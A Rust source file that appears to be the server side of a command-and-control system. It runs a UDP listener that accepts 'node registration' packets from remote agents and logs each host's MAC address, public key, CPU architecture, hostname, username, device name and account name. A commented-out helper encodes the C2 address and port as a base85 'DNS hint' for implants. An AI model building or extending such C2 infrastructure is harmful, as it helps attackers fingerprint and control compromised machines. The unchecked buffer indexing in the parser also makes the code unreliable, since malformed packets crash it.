use std::net::SocketAddr;

use tokio::net::UdpSocket;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    start_udp_listener().await;
    Ok(())
}

async fn start_udp_listener() {
    let sock = UdpSocket::bind("0.0.0.0:8888").await.unwrap();

    let mut buf = [0u8; 1024];
    loop {
        let (len, addr) = sock.recv_from(&mut buf).await.unwrap();
        println!("{:?} bytes received from {:?}", len, addr);

        if buf[0] != 77 || buf[1] != 33 {
            println!("discarded payload. does not have proper starting bits.");
            continue;
        }

        if buf[2] == 1 {
            // node registration
            handle_node_registration(addr, buf, len).await;
        }

        sock.send_to(b"ACK", addr).await.unwrap();
    }
}

async fn handle_node_registration(addr: SocketAddr, buf: [u8; 1024], len: usize) {
    let mut idx: usize = 3;

    let nodus_id: [u8; 32] = buf[idx..(idx + 32)].try_into().unwrap();
    idx += 32;

    let mac_addr = buf[idx..(idx + 6)]
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect::<Vec<_>>()
        .join(":");
    idx += 6;

    let asym_sec_algo = buf[idx];
    idx += 1;

    let asym_sec_pubkey_len = u16::from_be_bytes([buf[idx], buf[idx + 1]]) as usize;
    idx += 2;

    let asym_sec_pubkey = buf[idx..(idx + asym_sec_pubkey_len)].to_vec();
    idx += asym_sec_pubkey_len;

    let (cpu_arch, cpu_arch_len) = read_bytes_segment_as_string(&buf, idx);
    idx += cpu_arch_len;

    let (hostname, hostname_len) = read_bytes_segment_as_string(&buf, idx);
    idx += hostname_len;

    let (username, username_len) = read_bytes_segment_as_string(&buf, idx);
    idx += username_len;

    let (device_name, device_name_len) = read_bytes_segment_as_string(&buf, idx);
    idx += device_name_len;

    let (account_name, account_name_len) = read_bytes_segment_as_string(&buf, idx);
    idx += account_name_len;

    println!("mac: {}", mac_addr);
    println!("cpu_arch: {}", cpu_arch);
    println!("hostname: {}", hostname);
    println!("username: {}", username);
    println!("device_name: {}", device_name);
    println!("account_name: {}", account_name);
}

fn read_bytes_segment_as_string(buf: &[u8; 1024], index: usize) -> (String, usize) {
    let len = u16::from_be_bytes([buf[index], buf[index + 1]]) as usize;
    if len < 1 {
        return ("".into(), 2);
    }
    let bytes = buf[(index + 2)..(index + 2 + len)].to_vec();
    (String::from_utf8(bytes).unwrap(), len + 2)
}

// fn build_dns_hint() -> String {
//     // C2 IPv4 address: 4 bytes - if 0.0.0.0, then localhost (which is during dev/demo)
//     let port: u16 = 8888;
//     let port_bytes = port.to_be_bytes();
//     let bytes: [u8; 7] = [0, 0, 0, 0, port_bytes[0], port_bytes[1], 0x01];

//     base85::encode(&bytes)
// }
